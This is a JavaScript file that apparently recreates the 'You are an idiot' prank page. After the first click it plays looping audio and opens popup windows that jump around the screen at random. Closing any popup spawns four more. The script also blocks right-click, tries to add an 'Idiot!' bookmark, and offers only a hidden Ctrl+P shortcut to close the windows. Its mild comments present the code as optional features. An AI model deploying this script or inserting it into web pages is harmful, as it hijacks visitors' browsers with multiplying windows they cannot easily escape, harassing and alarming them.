/* Optional audio setup */
document.addEventListener('click', musicPlay);

function musicPlay() {
    var audio = document.getElementById('youare-audio');
    var micon = document.getElementById('youare-micon');

    if (audio && micon) {
        if (audio.duration > 0 && audio.paused) {
            audio.play();
            micon.src = "images/speaker.png";
        } else {
            audio.pause();
            audio.currentTime = 0;
            micon.src = "images/speakerm.png";
        }
    }

    openInitialTabs();
    document.removeEventListener('click', musicPlay);
}

/* Looping background audio */
var faudio = new Audio('youare.mp3');

faudio.addEventListener('timeupdate', function () {
    if (this.currentTime > this.duration - 0.45) {
        this.currentTime = 0;
        this.play();
    }
});

/* Popup tracking */
let popups = [];

/* Open popup window */
function openWindow(x, y) {
    const width = 357;
    const height = 330;

    const win = window.open(
        "lol.html",
        "_blank",
        `menubar=no,status=no,toolbar=no,resizable=yes,width=${width},height=${height}`
    );

    if (!win) return null;

    popups.push(win);

    try {
        win.moveTo(x, y);
    } catch (e) {}

    trackPopup(win);
    return win;
}

/* RANDOM TELEPORT SYSTEM (replaces bouncing) */
function trackPopup(win) {
    const teleportLoop = setInterval(() => {
        if (!win || win.closed) {
            clearInterval(teleportLoop);
            spawnPopups(4);
            return;
        }

        const width = 357;
        const height = 330;

        const screenX = window.screenX || window.screenLeft;
        const screenY = window.screenY || window.screenTop;

        const outerW = window.outerWidth;
        const outerH = window.outerHeight;

        const x = Math.floor(screenX + Math.random() * (outerW - width));
        const y = Math.floor(screenY + Math.random() * (outerH - height));

        try {
            win.moveTo(x, y);
        } catch (e) {}
    }, 500 + Math.random() * 800); // random teleport interval
}

/* Spawn multiple popup windows */
function spawnPopups(count) {
    const width = 357;
    const height = 330;

    const screenX = window.screenX || window.screenLeft;
    const screenY = window.screenY || window.screenTop;

    const outerW = window.outerWidth;
    const outerH = window.outerHeight;

    for (let i = 0; i < count; i++) {
        const x = Math.floor(screenX + Math.random() * (outerW - width));
        const y = Math.floor(screenY + Math.random() * (outerH - height));

        openWindow(x, y);
    }
}

/* Initial popups */
function openInitialTabs() {
    spawnPopups(4);
}

/* Close all popups */
function closeAllPopups() {
    popups.forEach(win => {
        try {
            if (win && !win.closed) win.close();
        } catch (e) {}
    });

    popups = [];
}

/* Keyboard shortcut: Ctrl + P */
document.addEventListener('keydown', function (e) {
    if (e.ctrlKey && e.key.toLowerCase() === 'p') {
        e.preventDefault();
        closeAllPopups();
    }
});

/* Optional title changer */
function changeTitle(title) {
    document.title = title;
}

/* Optional bookmark */
function bookmark() {
    if (
        navigator.appName == "Microsoft Internet Explorer" &&
        parseInt(navigator.appVersion) >= 4
    ) {
        window.external.AddFavorite("lol.html", "Idiot!");
    }
}

/* Disable right click */
window.oncontextmenu = function () {
    return false;
};

/* Startup */
window.onload = function () {
    bookmark();
};